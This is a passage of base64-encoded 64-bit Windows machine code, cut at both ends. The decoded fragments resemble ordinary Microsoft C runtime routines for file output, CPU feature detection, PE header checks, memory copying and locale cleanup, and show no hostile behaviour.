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EAdAXoLZb//0iLS2hIOw3aJQEAdAXoG5b//0iLS3BIOw3QJQEAdAXoCZb//0iLS3hIOw3GJQEAdAXo95X//0iLi4AAAABIOw25JQEAdAXo4pX//0iLi4gAAABIOw2sJQEAdAXozZX//0iLi5AAAABIOw2fJQEAdAXouJX//0iDxCBbw8zMSIXJdGZTSIPsIEiL2UiLCUg7DekkAQB0BeiSlf//SItLCEg7Dd8kAQB0BeiAlf//SItLEEg7DdUkAQB0Behulf//SItLWEg7DQslAQB0Behclf//SItLYEg7DQElAQB0BehKlf//SIPEIFvDSIXJD4TwAwAAU0iD7CBIi9lIi0kI6CqV//9Ii0sQ6CGV//9Ii0sY6BiV//9Ii0sg6A+V//9Ii0so6AaV//9Ii0sw6P2U//9Iiwvo9ZT//0iLS0Do7JT//0iLS0jo45T//0iLS1Do2pT//0iLS1jo0ZT//0iLS2DoyJT//0iLS2jov5T//0iLSzjotpT//0iLS3DorZT//0iLS3jopJT//0iLi4AAAADomJT//0iLi4gAAADojJT//0iLi5AAAADogJT//0iLi5gAAADodJT//0iLi6AAAADoaJT//0iLi6gAAADoXJT//0iLi7AAAADoUJT//0iLi7gAAADoRJT//0iLi8AAAADoOJT//0iLi8gAAADoLJT//0iLi9AAAADoIJT//0iLi9gAAADoFJT//0iLi+AAAADoCJT//0iLi+gAAADo/JP//0iLi/AAAADo8JP//0iLi/gAAADo5JP//0iLiwABAADo2JP//0iLiwgBAADozJP//0iLixABAADowJP//0iLixgBAADotJP//0iLiyABAADoqJP//0iLiygBAADonJP//0iLizABAADokJP//0iLizgBAADohJP//0iLi0ABAADoeJP//0iLi0gBAADobJP//0iLi1ABAADoYJP//0iLi2gBAADoVJP//0iLi3ABAADoSJP//0iLi3gBAADoPJP//0iLi4ABAADoMJP//0iLi4gBAADoJJP//0iLi5ABAADoGJP//0iLi2ABAADoDJP//0iLi6ABAADoAJP//0iLi6gBAADo9JL//0iLi7ABAADo6JL//0iLi7gBAADo3JL//0iLi8ABAADo0JL//0iLi8gBAADoxJL//0iLi5gBAADouJL//0iLi9ABAADorJL//0iLi9gBAADooJL//0iLi+ABAADolJL//0iLi+gBAADoiJL//0iLi/ABAADofJL//0iLi/gBAADocJL//0iLiwACAADoZJL//0iLiwgCAADoWJL//0iLixACAADoTJL//0iLixgCAADoQJL//0iLiyACAADoNJL//0iLiygCAADoKJL//0iLizACAADoHJL//0iLizgCAADoEJL//0iLi0ACAADoBJL//0iLi0gCAADo+JH//0iLi1ACAADo7JH//0iLi1gCAADo4JH//0iLi2ACAADo1JH//0iLi2gCAADoyJH//0iLi3ACAADovJH//0iLi3gCAADosJH//0iLi4ACAADopJH//0iLi4gCAADomJH//0iLi5ACAADojJH//0iLi5gCAADogJH//0iLi6ACAADodJH//0iLi6gCAADoaJH//0iLi7ACAADoXJH//0iLi7gCAADoUJH//0iDxCBbw8zMQFVBVEFVQVZBV0iD7FBIjWwkQEiJXUBIiXVISIl9UEiLBaIOAQBIM8VIiUUIi11gM/9Ni+FFi+hIiVUAhdt+KkSL00mLwUH/ykA4OHQMSP/ARYXSdfBBg8r/i8NBK8L/yDvDjVgBfAKL2ESLdXiL90WF9nUHSIsBRItwBPedgAAAAESLy02LxBvSQYvOiXwkKIPiCEiJfCQg/8L/Ffd+AABMY/iFwHUHM8DpFwIAAEm58P///////w+FwH5uM9JIjULgSff3SIP4AnJfS40MP0iNQRBIO8F2UkqNDH0QAAAASIH5AAQAAHcqSI1BD0g7wXcDSYvBSIPg8OiJFgAASCvgSI18JEBIhf90nMcHzMwAAOsT6G+Q//9Ii/hIhcB0CscA3d0AAEiDxxBIhf8PhHT///9Ei8tNi8S6AQAAAEGLzkSJfCQoSIl8JCD/FUZ+AACFwA+EWQEAAEyLZQAhdCQoSCF0JCBJi8xFi89Mi8dBi9XoHAoAAEhj8IXAD4QwAQAAQbkABAAARYXpdDaLTXCFyQ+EGgEAADvxD48SAQAASItFaIlMJChFi89Mi8dBi9VJi8xIiUQkIOjVCQAA6e8AAACFwH53M9JIjULgSPf2SIP4AnJoSI0MNkiNQRBIO8F2W0iNDHUQAAAASTvJdzVIjUEPSDvBdwpIuPD///////8PSIPg8Oh7FQAASCvgSI1cJEBIhdsPhJUAAADHA8zMAADrE+hdj///SIvYSIXAdA7HAN3dAABIg8MQ6wIz20iF23RtRYvPTIvHQYvVSYvMiXQkKEiJXCQg6DQJAAAzyYXAdDyLRXAz0kiJTCQ4RIvOTIvDSIlMJDCFwHULiUwkKEiJTCQg6w2JRCQoSItFaEiJRCQgQYvO/xUAfQAAi/BIjUvwgTnd3QAAdQXolY7//0iNT/CBOd3dAAB1BeiEjv//i8ZIi00ISDPN6OaI//9Ii11ASIt1SEiLfVBIjWUQQV9BXkFdQVxdw0iJXCQISIl0JBBXSIPscEiL8kiL0UiNTCRQSYvZQYv46NOW//+LhCTAAAAASI1MJFBMi8uJRCRAi4QkuAAAAESLx4lEJDiLhCSwAAAASIvWiUQkMEiLhCSoAAAASIlEJCiLhCSgAAAAiUQkIOij/P//gHwkaAB0DEiLTCRgg6HIAAAA/UyNXCRwSYtbEEmLcxhJi+Nfw8zMQFVBVEFVQVZBV0iD7EBIjWwkMEiJXUBIiXVISIl9UEiLBR4LAQBIM8VIiUUARIt1aDP/RYv5TYvgRIvqRYX2dQdIiwFEi3AE911wQYvOiXwkKBvSSIl8JCCD4gj/wv8VsHsAAEhj8IXAdQczwOneAAAAfndIuPD///////9/SDvwd2hIjQw2SI1BEEg7wXZbSI0MdRAAAABIgfkABAAAdzFIjUEPSDvBdwpIuPD///////8PSIPg8OhHEwAASCvgSI1cJDBIhdt0occDzMwAAOsT6C2N//9Ii9hIhcB0D8cA3d0AAEiDwxDrA0iL30iF2w+EdP///0yLxjPSSIvLTQPA6O3H//9Fi89Ni8S6AQAAAEGLzol0JChIiVwkIP8V8HoAAIXAdBVMi01gRIvASIvTQYvN/xURfAAAi/hIjUvwgTnd3QAAdQXodoz//4vHSItNAEgzzejYhv//SItdQEiLdUhIi31QSI1lEEFfQV5BXUFcXcPMzEiJXCQISIl0JBBXSIPsYIvySIvRSI1MJEBBi9lJi/joxJT//4uEJKAAAABIjUwkQESLy4lEJDCLhCSYAAAATIvHiUQkKEiLhCSQAAAAi9ZIiUQkIOgv/v//gHwkWAB0DEiLTCRQg6HIAAAA/UiLXCRwSIt0JHhIg8RgX8NIi8RIiVgQSIloGEiJcCCJSAhXSIPsIEiLykiL2uhuy///i0sYSGPw9sGCdRfoEqH//8cACQAAAINLGCCDyP/pMgEAAPbBQHQN6Pag///HACIAAADr4jP/9sEBdBmJewj2wRAPhIkAAABIi0MQg+H+SIkDiUsYi0MYiXsIg+Dvg8gCiUMYqQwBAAB1L+i/kf//SIPAMEg72HQO6LGR//9Ig8BgSDvYdQuLzugJy///hcB1CEiLy+jtEQAA90MYCAEAAA+EiwAAAIsrSItTECtrEEiNQgFIiQOLQyT/yIlDCIXtfhlEi8WLzuhO6///i/jrVYPJIIlLGOk/////jUYCg/gBdh5Ii85Ii8ZMjQX+XAEAg+EfSMH4BUhr0VhJAxTA6wdIjRV2DQEA9kIIIHQXM9KLzkSNQgLo5w4AAEiD+P8PhPH+//9Ii0sQikQkMIgB6xa9AQAAAEiNVCQwi85Ei8Xo1er//4v4O/0Phcf+//8PtkQkMEiLXCQ4SItsJEBIi3QkSEiDxCBfw8xIiVwkCEiJdCQYZkSJTCQgV0iD7GBJi/hIi/JIi9lIhdJ1E02FwHQOSIXJdAIhETPA6ZUAAABIhcl0A4MJ/0mB+P///392E+hsn///uxYAAACJGOhIj///629Ii5QkkAAAAEiNTCRA6HSS//9Ii0QkQEiDuDgBAAAAdX8Pt4QkiAAAALn/AAAAZjvBdlBIhfZ0EkiF/3QNTIvHM9JIi87o0MT//+gPn///xwAqAAAA6ASf//+LGIB8JFgAdAxIi0wkUIOhyAAAAP2Lw0yNXCRgSYtbEEmLcyBJi+Nfw0iF9nQLSIX/D4SJAAAAiAZIhdt0VccDAQAAAOtNg2QkeABIjUwkeEyNhCSIAAAASIlMJDhIg2QkMACLSARBuQEAAAAz0ol8JChIiXQkIP8Va3cAAIXAdBmDfCR4AA+FZP///0iF23QCiQMz2+lo/////xXYdgAAg/h6D4VH////SIX2dBJIhf90DUyLxzPSSIvO6ADE///oP57//7siAAAAiRjoG47//+ks////zMxIg+w4SINkJCAA6GX+//9Ig8Q4w0iJXCQISIlsJBhWV0FWSIPsIESL8UiLykiL2uhEyP//i1MYSGPw9sKCdRno6J3//8cACQAAAINLGCC4//8AAOk2AQAA9sJAdA3oyp3//8cAIgAAAOvgM//2wgF0GYl7CPbCEA+EigAAAEiLQxCD4v5IiQOJUxiLQxiJewiD4O+DyAKJQxipDAEAAHUv6JOO//9Ig8AwSDvYdA7ohY7//0iDwGBIO9h1C4vO6N3H//+FwHUISIvL6MEOAAD3QxgIAQAAD4SKAAAAiytIi1MQK2sQSI1CAkiJA4tDJIPoAolDCIXtfhlEi8WLzugh6P//i/jrVYPKIIlTGOk8////jUYCg/gBdh5Ii85Ii8ZMjQXRWQEAg+EfSMH4BUhr0VhJAxTA6wdIjRVJCgEA9kIIIHQXM9KLzkSNQgLougsAAEiD+P8PhO7+//9Ii0MQZkSJMOscvQIAAABIjVQkSIvORIvFZkSJdCRI6KTn//+L+Dv9D4XA/v//QQ+3xkiLXCRASItsJFBIg8QgQV5fXsPMzMy5AgAAAOnWpf//zMxIg+woSIXJdRnobpz//8cAFgAAAOhLjP//SIPI/0iDxCjDTIvBSIsNFFkBADPSSIPEKEj/JV92AADMzMxIg+wo6NPa//9IhcB0CrkWAAAA6PTa///2BbUWAQACdCm5FwAAAOhlRwAAhcB0B7kHAAAAzSlBuAEAAAC6FQAAQEGNSALoeor//7kDAAAA6BSm///MzMzMSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsIEiL6TP/vuMAAABMjTU6rAAAjQQ+QbhVAAAASIvNmSvC0fhIY9hIi9NIA9JJixTW6AMBAACFwHQTeQWNc//rA417ATv+fsuDyP/rC0iLw0gDwEGLRMYISItcJDBIi2wkOEiLdCRASIt8JEhIg8QgQV7DzMxIg+woSIXJdCLoZv///4XAeBlImEg95AAAAHMPSI0NdZ0AAEgDwIsEwesCM8BIg8Qow8zMTIvcSYlbCEmJcxBXSIPsUEyLFb1lAQBBi9lJi/hMMxUQAwEAi/J0KjPASYlD6EmJQ+BJiUPYi4QkiAAAAIlEJChIi4QkgAAAAEmJQ8hB/9LrLeh1////RIvLTIvHi8iLhCSIAAAAi9aJRCQoSIuEJIAAAABIiUQkIP8VzXQAAEiLXCRgSIt0JGhIg8RQX8PMRTPJTIvSTIvZTYXAdENMK9pDD7cME41Bv2aD+Bl3BGaDwSBBD7cSjUK/ZoP4GXcEZoPCIEmDwgJJ/8h0CmaFyXQFZjvKdMoPt8JED7fJRCvIQYvBw8zMzMzMzMzMzMzMzMzMzMzMzMzMzGZmDx+EAAAAAABMi9lMi9JJg/gQD4a5AAAASCvRcw9Ji8JJA8BIO8gPjJYDAAAPuiVkYwEAAXMTV1ZIi/lJi/JJi8jzpF5fSYvDww+6JUdjAQACD4JWAgAA9sEHdDb2wQF0C4oECkn/yIgBSP/B9sECdA9miwQKSYPoAmaJAUiDwQL2wQR0DYsECkmD6ASJAUiDwQRNi8hJwekFD4XZAQAATYvIScHpA3QUSIsECkiJAUiDwQhJ/8l18EmD4AdNhcB1B0mLw8MPHwBIjRQKTIvR6wNNi9NMjQ1dYf//Q4uEgbCeAABJA8H/4PSeAAD4ngAAA58AAA+fAAAknwAALZ8AAD+fAABSnwAAbp8AAHifAACLnwAAn58AALyfAADNnwAA558AAAKgAAAmoAAASYvDw0gPtgJBiAJJi8PDSA+3AmZBiQJJi8PDSA+2AkgPt0oBQYgCZkGJSgFJi8PDiwJBiQJJi8PDSA+2AotKAUGIAkGJSgFJi8PDSA+3AotKAmZBiQJBiUoCSYvDw0gPtgJID7dKAYtSA0GIAmZBiUoBQYlSA0mLw8NIiwJJiQJJi8PDSA+2AkiLSgFBiAJJiUoBSYvDw0gPtwJIi0oCZkGJAkmJSgJJi8PDSA+2AkgPt0oBSItSA0GIAmZBiUoBSYlSA0mLw8OLAkiLSgRBiQJJiUoESYvDw0gPtgKLSgFIi1IFQYgCQYlKAUmJUgVJi8PDSA+3AotKAkiLUgZmQYkCQYlKAkmJUgZJi8PDTA+2AkgPt0IBi0oDSItSB0WIAmZBiUIBQYlKA0mJUgdJi8PD8w9vAvNBD38CSYvDw2ZmZmZmDx+EAAAAAABIiwQKTItUCghIg8EgSIlB4EyJUehIi0QK8EyLVAr4Sf/JSIlB8EyJUfh11EmD4B/p8v3//0mD+CAPhuEAAAD2wQ91Dg8QBApIg8EQSYPoEOsdDxAMCkiDwSCA4fAPEEQK8EEPEQtIi8FJK8NMK8BNi8hJwekHdGYPKUHw6wpmkA8pQeAPKUnwDxAECg8QTAoQSIHBgAAAAA8pQYAPKUmQDxBECqAPEEwKsEn/yQ8pQaAPKUmwDxBECsAPEEwK0A8pQcAPKUnQDxBECuAPEEwK8HWtDylB4EmD4H8PKMFNi8hJwekEdBpmDx+EAAAAAAAPKUHwDxAECkiDwRBJ/8l170mD4A90DUmNBAgPEEwC8A8RSPAPKUHwSYvDww8fQABBDxACSY1MCPAPEAwKQQ8RAw8RCUmLw8MPH4QAAAAAAGZmZpBmZmaQZpAPuiXOXwEAAg+CuQAAAEkDyPbBB3Q29sEBdAtI/8mKBApJ/8iIAfbBAnQPSIPpAmaLBApJg+gCZokB9sEEdA1Ig+kEiwQKSYPoBIkBTYvIScHpBXVBTYvIScHpA3QUSIPpCEiLBApJ/8lIiQF18EmD4AdNhcB1D0mLw8NmZmYPH4QAAAAAAEkryEyL0UiNFArpffz//5BIi0QK+EyLVArwSIPpIEiJQRhMiVEQSItECghMixQKSf/JSIlBCEyJEXXVSYPgH+uOSYP4IA+GBf///0kDyPbBD3UOSIPpEA8QBApJg+gQ6xtIg+kQDxAMCki